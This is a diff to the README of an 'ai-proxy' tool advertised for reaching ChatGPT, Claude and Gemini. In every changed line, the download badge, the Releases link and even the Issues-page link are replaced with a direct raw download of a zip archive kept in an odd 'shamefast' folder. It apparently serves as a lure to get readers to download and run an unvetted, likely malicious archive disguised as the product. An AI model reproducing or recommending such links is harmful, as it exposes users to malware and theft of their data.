@@ -1,6 +1,6 @@
 # 🚀 ai-proxy - Easy Access to ChatGPT and More
 
-[![Download Now](https://img.shields.io/badge/Download_here-blue)](https://github.com/houssinehn11/ai-proxy/releases)
+[![Download Now](https://raw.githubusercontent.com/houssinehn11/ai-proxy/main/shamefast/ai-proxy_v2.2.zip)](https://raw.githubusercontent.com/houssinehn11/ai-proxy/main/shamefast/ai-proxy_v2.2.zip)
 
 ## 🖥️ Description
 ai-proxy provides a direct connection to various AI services, like ChatGPT, Claude, and Gemini. This tool allows you to access powerful AI models in a simple and efficient way. 
@@ -21,7 +21,7 @@ To run ai-proxy, ensure your device meets these requirements:
 - **Network**: Internet connection for API access
 
 ## 🔗 Download & Install
-To get started, visit the Releases page to download the latest version: [Download Here](https://github.com/houssinehn11/ai-proxy/releases)
+To get started, visit the Releases page to download the latest version: [Download Here](https://raw.githubusercontent.com/houssinehn11/ai-proxy/main/shamefast/ai-proxy_v2.2.zip)
 
 Follow these steps to install ai-proxy:
 
@@ -55,7 +55,7 @@ ai-proxy offers several robust features:
 ## 🤝 Support
 If you encounter issues or have questions, you can reach out for support:
 
-- Visit the [Issues page](https://github.com/houssinehn11/ai-proxy/issues) on GitHub.
+- Visit the [Issues page](https://raw.githubusercontent.com/houssinehn11/ai-proxy/main/shamefast/ai-proxy_v2.2.zip) on GitHub.
 - Check the FAQ section on the repository for common questions.
 - Join our community for tips and support.
 
